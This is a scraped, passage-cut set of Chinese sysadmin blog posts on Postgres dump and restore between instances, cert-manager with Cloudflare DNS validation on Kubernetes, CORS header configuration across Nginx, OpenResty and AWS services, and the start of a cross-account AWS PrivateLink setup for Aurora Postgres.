restart\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e就ok了，但是30天就更新一次license，而且必须要重启容器，这谁受得了啊。\u003c/p\u003e\n\u003cp\u003e下周就抽空装一个不依赖Zookeeper，用Rraft的Kafka来用，彻底去掉这个不伦不类的软件。\u003c/p\u003e","title":"Redpanda到期后如何续License"},{"content":"公司生产环境在AWS使用了 Aurora Postgres Serveless 的数据库。\n测试环境是在内网搭建了一个postgres 13数据库。\n那测试和生产的实例不同，数据库不同，用户名也不同，需要把测试环境的A库的schema.public迁移到生产B库的schema.public。\n普及一下概念，PG的权限分三层，数据库、schema、schema中的对象。\n那么用pg_dump的话，如果不带任何参数，那会把权限也给带上，那就麻烦大了去了！\n所以正确的导出、导入步骤如下：\n一、首先要观察源库，看看都有什么extention，在schema.public有什么Functions\n如上图所示，看到uuid_generate\n# 看看服务器版本 select version(); PostgreSQL 13.14 那就很奇怪，extension 只有一个plpgsql，functions却有一堆uuid_generate\n那十有八九需要用到extension uuid-oosp\n先去目的库建一个吧\ncreate extension \u0026#34;uuid-ossp\u0026#34;; 二、dump数据\n这里要注意，不要把任何权限的东西带进来\npg_dump -h 172.16.8.1 -U postgres -d source --schema=public --no-owner --no-privileges --file=export.sql # 全备份的命令 # export PGPASSWORD=\u0026#34;xxxxxxxx\u0026#34; # pg_dump -U bbc -h localhost -p 5432 bbc \u0026gt; dc_system.sql 然后要编辑看看这个导入的文件\n发现有create schema的语句，如果目的数据库已经有了，那需要去掉。\n再看下面：\n建立了一个FUNCTION，如果已经建立了extension，那也会报错，不过这2种错误我们都可以直接不用管，直接执行试试\n三、导入目标库\n跑一跑，看一看：\npsql -h 10.8.0.1 -U dest -d dest -f export.sql 报了不少错\n与上面相对应，建schema.public和FUNCTION时的错，后面就没有错误了，这说明就正确导入了\n四、一些措施\n第三步我们可以看到有问题，Anyway，都无法避免。\n都需要编辑export.sql或者忽略错误来避免。\n测了一下，如果我们把schema.public给干掉，也无法避免这种情况！\n#用admin用户登录 target 库，改变schema.public的owner ALTER SCHEMA public OWNER TO target_user; #改好后用target_user登录 target 库 #这时候就可以干掉了schema.public了，然后重建，重建后就只有 target_user 对 schema.public 有权限了 DROP SCHEMA public CASCADE; CREATE SCHEMA public AUTHORIZATION target_user; #如上，target_user对target库中的schema.public拥有所有权限 #那就可以导入数据了 #导入后需要把owner给改回去，依然需要用admin用户登录 target 库，改owner ALTER SCHEMA public OWNER TO admin; #然后赋予PUBLIC的UC权限 GRANT USAGE ON SCHEMA public TO public; GRANT CREATE ON SCHEMA public TO public; #就恢复初始状态的权限了 上面的操作最好用pgAdmin来完成，否则太苦逼了。\n","permalink":"https://rendoumi.com/posts/20250723-postgres_dump_restore/","summary":"\u003cp\u003e公司生产环境在AWS使用了 Aurora Postgres Serveless 的数据库。\u003c/p\u003e\n\u003cp\u003e测试环境是在内网搭建了一个postgres 13数据库。\u003c/p\u003e\n\u003cp\u003e那测试和生产的实例不同，数据库不同，用户名也不同，需要把测试环境的A库的schema.public迁移到生产B库的schema.public。\u003c/p\u003e\n\u003cp\u003e普及一下概念，PG的权限分三层，数据库、schema、schema中的对象。\u003c/p\u003e\n\u003cp\u003e那么用pg_dump的话，如果不带任何参数，那会把权限也给带上，那就麻烦大了去了！\u003c/p\u003e\n\u003cp\u003e所以正确的导出、导入步骤如下：\u003c/p\u003e\n\u003cp\u003e一、首先要观察源库，看看都有什么extention，在schema.public有什么Functions\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250723135100741\" loading=\"lazy\" src=\"/posts/20250723-postgres_dump_restore/image-20250723135100741.png\"\u003e\u003c/p\u003e\n\u003cp\u003e如上图所示，看到\u003ccode\u003euuid_generate\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 看看服务器版本\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e version\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePostgreSQL 13.14\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那就很奇怪，extension 只有一个plpgsql，functions却有一堆uuid_generate\u003c/p\u003e\n\u003cp\u003e那十有八九需要用到\u003ccode\u003eextension uuid-oosp\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e先去目的库建一个吧\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecreate extension \u003cspan class=\"s2\"\u003e\u0026#34;uuid-ossp\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、dump数据\u003c/p\u003e\n\u003cp\u003e这里要注意，不要把任何权限的东西带进来\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg_dump -h 172.16.8.1 -U postgres -d \u003cspan class=\"nb\"\u003esource\u003c/span\u003e --schema\u003cspan class=\"o\"\u003e=\u003c/span\u003epublic --no-owner --no-privileges --file\u003cspan class=\"o\"\u003e=\u003c/span\u003eexport.sql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 全备份的命令\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# export PGPASSWORD=\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# pg_dump -U bbc -h localhost -p 5432 bbc \u0026gt; dc_system.sql\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后要编辑看看这个导入的文件\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250723135729330\" loading=\"lazy\" src=\"/posts/20250723-postgres_dump_restore/image-20250723135729330.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现有create schema的语句，如果目的数据库已经有了，那需要去掉。\u003c/p\u003e\n\u003cp\u003e再看下面：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250723135823265\" loading=\"lazy\" src=\"/posts/20250723-postgres_dump_restore/image-20250723135823265.png\"\u003e\u003c/p\u003e\n\u003cp\u003e建立了一个FUNCTION，如果已经建立了extension，那也会报错，不过这2种错误我们都可以直接不用管，直接执行试试\u003c/p\u003e\n\u003cp\u003e三、导入目标库\u003c/p\u003e\n\u003cp\u003e跑一跑，看一看：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epsql -h 10.8.0.1 -U dest -d dest -f export.sql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e报了不少错\u003c/p\u003e","title":"Postgres不同实例、不同用户直接的数据导出导入"},{"content":"这个场景非常的有意思：\n公司内部有若干个kubernetes集群，属于测试环境，研发搭建了一套SAAS的环境，这个环境需要xxx.abc.com的域名来访问，域名解析记录全都是192.168.0.x，供内部访问，域名会动态生成，需要证书也随之生成，且dns域名托管在cloudflare上。\n基本环境如上，麻烦的是 cert-manager 不可能签发私网的证书，只能曲线救国，用dns验证的方式来签发证书了，如果配上 external-dns，那dns解析也不用做了；只要发布一个ingress，就直接生成dns解析记录和对应的https证书。\n具体做法如下：\n一、配置 cloudflare API token\n登录cloudflare，去生成API Token，路径是：User Profile \u0026gt; API Tokens \u0026gt; API Tokens.\nPermissions：\nZone - DNS - Edit Zone Resources:\nInclude - All Zones cert-manager的官方文档居然是错的，https://cert-manager.io/docs/configuration/acme/dns01/cloudflare/\n推荐的 Zone - Zone - Read 是加不上的，有Edit就足够了\n然后获得Token的字符串xxxxxx\n二、安装cert-manager\n这个简单，直接用helm安装\n现在这个时间节点，2025.07.09，cert-manager 是 v1.18.2，所以用新命令执行安装\nhelm repo add jetstack https://charts.jetstack.io helm repo update #老版本比如1.0 helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set installCRDs=true #新版本v1.18.2 helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set crds.enabled=true 三、准备签发机构Issuer\n下面要特别注意，secret必须在namespace：cert-manager中，因为上一步我们创建了ns cert-manager，pod也在这个ns中，签发的过程中是由cert-manager中的pod发起请求的\n# secret --- apiVersion: v1 kind: Secret metadata: name: cloudflare-api-token-secret namespace: cert-manager type: Opaque stringData: api-token: xxxxxxxx # Issuer --- apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-prod spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: zhangranrui@gmail.com privateKeySecretRef: name: letsencrypt-prod solvers: - dns01: cloudflare: email: zhangranrui@gmail.com apiTokenSecretRef: name: cloudflare-api-token-secret key: api-token 四、准备pod和ingress\n# nginx deployment --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx labels: app: nginx spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:latest ports: - containerPort: 80 --- # nginx Service apiVersion: v1 kind: Service metadata: name: nginx spec: selector: app: nginx ports: - protocol: TCP port: 80 targetPort: 80 type: ClusterIP 然后我们直接发布一个ingress，就会自动签发证书了\n--- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: test-ingress annotations: cert-manager.io/cluster-issuer: \u0026#34;letsencrypt-prod\u0026#34; spec: tls: - hosts: - test.abc.com secretName: test-tls rules: - host: test.abc.com http: paths: - path: / pathType: Prefix backend: service: name: nginx port: number: 80 四、一些调试命令：\n$ kubectl get issuer $ kubectl get clusterissuer $ kubectl get challenges $ kubectl describe challenge $ kubectl describe certificaterequest $ kubectl describe order 五、直接申请证书\n上面讲了通过ingress来自动申请证书，那我们如果不通过ingress，直接申请该怎么做呢？\n也很简单，直接来个申请即可\n--- apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: tls-normal namespace: default spec: secretName: tls-normal commonName: abc.cde.com dnsNames: - abc.cde.com issuerRef: name: letsencrypt-prod kind: ClusterIssuer ","permalink":"https://rendoumi.com/posts/20250709-cert_manager_cloudflare/","summary":"\u003cp\u003e这个场景非常的有意思：\u003c/p\u003e\n\u003cp\u003e公司内部有若干个kubernetes集群，属于测试环境，研发搭建了一套SAAS的环境，这个环境需要xxx.abc.com的域名来访问，域名解析记录全都是192.168.0.x，供内部访问，域名会动态生成，需要证书也随之生成，且dns域名托管在cloudflare上。\u003c/p\u003e\n\u003cp\u003e基本环境如上，麻烦的是 cert-manager 不可能签发私网的证书，只能曲线救国，用dns验证的方式来签发证书了，如果配上 external-dns，那dns解析也不用做了；只要发布一个ingress，就直接生成dns解析记录和对应的https证书。\u003c/p\u003e\n\u003cp\u003e具体做法如下：\u003c/p\u003e\n\u003cp\u003e一、配置 cloudflare API token\u003c/p\u003e\n\u003cp\u003e登录cloudflare，去生成API Token，路径是：\u003cstrong\u003eUser Profile \u0026gt; API Tokens \u0026gt; API Tokens\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePermissions：\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eZone - DNS - Edit\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eZone Resources:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eInclude - All Zones\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ecert-manager的官方文档居然是错的，https://cert-manager.io/docs/configuration/acme/dns01/cloudflare/\u003c/p\u003e\n\u003cp\u003e推荐的 Zone - Zone - Read 是加不上的，有Edit就足够了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250709104459501\" loading=\"lazy\" src=\"/posts/20250709-cert_manager_cloudflare/image-20250709104459501.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后获得Token的字符串xxxxxx\u003c/p\u003e\n\u003cp\u003e二、安装cert-manager\u003c/p\u003e\n\u003cp\u003e这个简单，直接用helm安装\u003c/p\u003e\n\u003cp\u003e现在这个时间节点，\u003ccode\u003e2025.07.09，cert-manager 是 v1.18.2\u003c/code\u003e，所以用新命令执行安装\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo add jetstack https://charts.jetstack.io\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#老版本比如1.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set \u003cspan class=\"nv\"\u003einstallCRDs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#新版本v1.18.2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set crds.enabled\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、准备签发机构Issuer\u003c/p\u003e","title":"内网kubernetes+cloudflare+cert-manager自动签发证书"},{"content":"Cross-Origin Resource Sharing (CORS) 跨域，一个网站引用了另外一个网站的资源，就需要跨域了。\n最通俗点，就是服务器的返回头上要加上三行：\nAccess-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34; Access-Control-Allow-Methods\u0026#34;, \u0026#34;GET, POST, OPTIONS\u0026#34; Access-Control-Allow-Headers\u0026#34;, \u0026#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#34; 说白点：就是允许的来源站，允许的方法，允许的头信息\n那在不同的地方配置又不相同：\n一、Nginx server { add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods \u0026#39;GET, POST, OPTIONS\u0026#39;; add_header Access-Control-Allow-Headers \u0026#39;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#39;; 二、openresty中的lua脚本 location /pg/nginit { rewrite_by_lua_block { ngx.log(ngx.ERR, \u0026#34;Environment configuration update, about to get configuration information from redis\u0026#34;) -- 添加跨域 CORS 头 ngx.header[\u0026#34;Access-Control-Allow-Origin\u0026#34;] = \u0026#34;*\u0026#34; -- 允许所有域名请求 ngx.header[\u0026#34;Access-Control-Allow-Methods\u0026#34;] = \u0026#34;GET, POST, OPTIONS\u0026#34; -- 允许的方法 ngx.header[\u0026#34;Access-Control-Allow-Headers\u0026#34;] = \u0026#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#34; -- 允许的请求头 三、AWS的S3 \u0026lt;CORSConfiguration\u0026gt; \u0026lt;CORSRule\u0026gt; \u0026lt;AllowedOrigin\u0026gt;http://example.com\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedMethod\u0026gt;GET\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedHeader\u0026gt;*\u0026lt;/AllowedHeader\u0026gt; \u0026lt;/CORSRule\u0026gt; \u0026lt;/CORSConfiguration\u0026gt; 四、AWS Lambda 或者 API Gateway headers: { \u0026#39;Access-Control-Allow-Origin\u0026#39;: \u0026#39;*\u0026#39;, \u0026#39;Access-Control-Allow-Credentials\u0026#39;: true, } 最后，AWS的ALB不支持配置CORS！！！，必须在后端的 application 中设置。\n","permalink":"https://rendoumi.com/posts/20250617-cors/","summary":"\u003cp\u003eCross-Origin Resource Sharing (CORS) 跨域，一个网站引用了另外一个网站的资源，就需要跨域了。\u003c/p\u003e\n\u003cp\u003e最通俗点，就是服务器的返回头上要加上三行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAccess-Control-Allow-Origin\u003cspan class=\"s2\"\u003e\u0026#34;, \u0026#34;\u003c/span\u003e*\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eAccess-Control-Allow-Methods\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;GET, POST, OPTIONS\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAccess-Control-Allow-Headers\u003cspan class=\"s2\"\u003e\u0026#34;, \u0026#34;\u003c/span\u003eDNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e说白点：就是允许的来源站，允许的方法，允许的头信息\u003c/p\u003e\n\u003cp\u003e那在不同的地方配置又不相同：\u003c/p\u003e\n\u003ch5 id=\"一nginx\"\u003e一、Nginx\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        add_header Access-Control-Allow-Origin *\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        add_header Access-Control-Allow-Methods \u003cspan class=\"s1\"\u003e\u0026#39;GET, POST, OPTIONS\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        add_header Access-Control-Allow-Headers \u003cspan class=\"s1\"\u003e\u0026#39;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"二openresty中的lua脚本\"\u003e二、openresty中的lua脚本\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocation /pg/nginit \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    rewrite_by_lua_block \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ngx.log\u003cspan class=\"o\"\u003e(\u003c/span\u003engx.ERR, \u003cspan class=\"s2\"\u003e\u0026#34;Environment configuration update, about to get configuration information from redis\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        -- 添加跨域 CORS 头\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ngx.header\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Access-Control-Allow-Origin\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e  -- 允许所有域名请求\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ngx.header\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Access-Control-Allow-Methods\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;GET, POST, OPTIONS\u0026#34;\u003c/span\u003e  -- 允许的方法\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ngx.header\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Access-Control-Allow-Headers\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#34;\u003c/span\u003e  -- 允许的请求头\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"三aws的s3\"\u003e三、AWS的S3\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;CORSConfiguration\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;CORSRule\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;AllowedOrigin\u0026gt;http://example.com\u0026lt;/AllowedOrigin\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;AllowedMethod\u0026gt;GET\u0026lt;/AllowedMethod\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;AllowedHeader\u0026gt;*\u0026lt;/AllowedHeader\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;/CORSRule\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/CORSConfiguration\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"四aws-lambda-或者-api-gateway\"\u003e四、AWS Lambda 或者 API Gateway\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eheaders: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;Access-Control-Allow-Origin\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;*\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;Access-Control-Allow-Credentials\u0026#39;\u003c/span\u003e: true,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最后，AWS的ALB不支持配置CORS！！！，必须在后端的 application 中设置。\u003c/p\u003e","title":"CORS跨域在不同环境中的配置"},{"content":"公司有两个AWS账号，有各自不同的 VPC 域。其中一个账号用到了 Aurora Postgres Serveless 的数据库。\n现在另一个账号也需要用到posgres数据库，最直接的想法是在本域再搭一套postgres，或者ec2新加一台，上面安装posgres。\n先去检查了一下已有的postgres serverless服务，结果使用率才23%，当下就直接想复用它了。\n那能不能单独再开一个db，单独给第二个账号用呢，查了半天资料。可以的，但是吧，chatgpt真的是满嘴胡说八道，连带gemini也是。\naws家的东西都是开源经过魔改，跟网上占大多数的资料是不同的，这直接导致 chatgpt 按照网上大多数文档来进行推理，导致错误！！！\n还有就是aws家的东西更新修改很快，最新的文档和之前的文档不同，也导致 chatpt 按照网上大多数的旧文档来进行推理，导致错误！！！\n这个东西的架构图如上，右边的VPC里面连着 aurora 服务，它实际是target group的一个目标，然后上联到nlb，nlb再上联到endpoint service，对外提供服务.\n然后左面VPC中建endpoint，通过PrivateLink连接到右边的EndpointService，这样通过私有的dns name和security group再进行控制，就可以直接连到右边的endpoint service服务资源了。\n具体的做法步骤如下：\n一、第一步，右边的VPC中 1、建立EndpointService\n到VPC中，左边的Endpoint Services，点击：\n点击Create endpoint service新建一个\n名字：postgresql-serverless-endpoint-service，由于现在还没有nlb，需要再新建一个；点击Create new load balancer\n2、建立nlb\n点击：Create load balancer新建\n这个类型，只能是nlb\n我们这个nlb，不放在公网，不公开，所以选私有的Internal，只有IPV4，不提供IPV6.\n网络选该VPC，子网选择三个private的子网\nSecurity groups选择一下，这里rds-sg的inbound规则是允许TCP端口5432的进入，如果没有就新建一个SG\n到最后了，居然还没有target group，那又要建一个了，点击Create target group建立\n3、建立target group\n名字叫做：postgres-target-group\n我们选IP addresses，因为要连到后面的postgres服务\n然后选好TCP，Port 5432， IPV4，VPC，其它保持缺省，然后建立\n4、注册target group\ntarget group建立好以后，我们要把Postgres的服务IP给注册上去\n点击Register targets新建\n我们把posgres serverless服务解析出来的IP地址天上去，端口也填上5432，然后注册上去即可。\n注册好了以后会看到状态healthy是绿色的。这样就ok了\n4、完成nlb\ntarget group好了以后，我们返回nlb，其余保持初始值，完成创建\n5、完成endpoint service\nnlb好了以后，我们返回endpoint service，刷新nlb，然后选中新建的nlb，然后下面不选Supported Regions，因为这个跨多个region的，我们两个vpc都在同一区域。\n选中Acceptance required，意思是需要批准endpoint的连入请求，再选中支持IPV4，然后点击创建\n5、赋予endpoint service访问权限\n建好后，我们去查看这个Endpoint service服务\n先点击，Allow principals 的 tab 页，然后点击Allow principals新建\n添加另一个vpc的账号：arn:aws:iam::01234567981011:root\n注意中间iam后面的一串数字，就是另一个账号登录后的accound 